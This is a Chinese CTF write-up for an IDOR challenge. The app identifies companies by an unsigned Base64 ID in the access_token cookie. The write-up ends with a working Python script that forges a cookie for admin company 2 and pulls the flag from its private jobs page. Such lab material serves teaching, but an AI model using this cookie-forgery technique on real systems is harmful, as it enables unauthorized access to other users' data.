

## 1、题目描述

一个简单的 IDOR（Insecure Direct Object Reference）漏洞：应用将用户 ID 放在 cookie 的 access_token 中，并使用 Base64 编码（`Bearer <base64(id)>`）来标识用户；服务器并未签名或验证该值的完整性。靶机：http://ip32785


## 2、知识点

- IDOR（不安全的直接对象引用）
- Cookie 篡改
- Base64 编码不是认证或签名机制


## 3、题目解题方法思路

服务端的 `create_access_token` 只是把 `company.id` 做了 `base64` 编码并在登录时放入 cookie：

- Cookie 值格式为 `Bearer <base64(id)>`。
- 校验逻辑 `validate_token` 只做了 `base64` 解码并比较解码出的 id 是否等于 URL 中的 `company_id`。

因此可以通过构造一个带有任意公司 id 的 `access_token` cookie（比如管理员公司的 id）来访问该公司受保护的资源（私有职位），进而读取 flag。


## 4、解题步骤

1. 分析 `main.py`：找到 `create_access_token`（只做 base64 编码）和 `validate_token`（仅通过 base64 解码后比较 id）逻辑。
2. 推断存在公司 `company2`（启动脚本创建），其 `is_admin=True`，并且会创建一个私有职位 `secret`，描述字段就是 `flag.txt` 中的 flag。
3. 构造 cookie：`access_token=Bearer <base64(2)>`（假设管理员公司 id 为 2）。
4. 访问 `GET /company/2/jobs`，并在响应中提取 `secret` 职位的 description，即可获得 flag。


## 5、exp

下面是完整的 Python exp 脚本，使用 `requests` 发起请求并解析返回页面获取 flag：

```python
#!/usr/bin/env python3
import base64
import requests
import re

# target configuration
TARGET = "http://ip32785"
# company id that is admin and has private job containing flag
TARGET_COMPANY_ID = 2


def build_cookie(company_id: int) -> str:
    """Build the access_token cookie value used by the app: 'Bearer ' + base64(id)"""
    b64 = base64.b64encode(str(company_id).encode()).decode()
    return f"Bearer {b64}"


def get_jobs_page(target: str, company_id: int) -> str:
    url = f"{target}/company/{company_id}/jobs"
    cookies = {"access_token": build_cookie(company_id)}
    r = requests.get(url, cookies=cookies, timeout=10)
    r.raise_for_status()
    return r.text


def extract_flag_from_jobs(html: str) -> str | None:
    # jobs.html lists jobs as: <p>{{ job.title }}:{{ job.description }}</p>
    # we look for the job title 'secret' or the flag pattern
    m = re.search(r"secret[:\s]*([^<\n]+)", html, re.IGNORECASE)
    if m:
        return m.group(1).strip()
    # fallback: search for FLAG-like token
    m2 = re.search(r"FLAG[^<\s]*", html)
    if m2:
        return m2.group(0)
    return None


def main():
    print(f"[+] Target: {TARGET}")
    print(f"[+] Trying to access company {TARGET_COMPANY_ID} jobs by forging cookie")
    html = get_jobs_page(TARGET, TARGET_COMPANY_ID)
    flag = extract_flag_from_jobs(html)
    if flag:
        print(f"[+] Found flag: {flag}")
    else:
        print("[-] Could not find flag in response. Here is the response snippet:")
        print(html[:800])


if __name__ == '__main__':
    main()
```

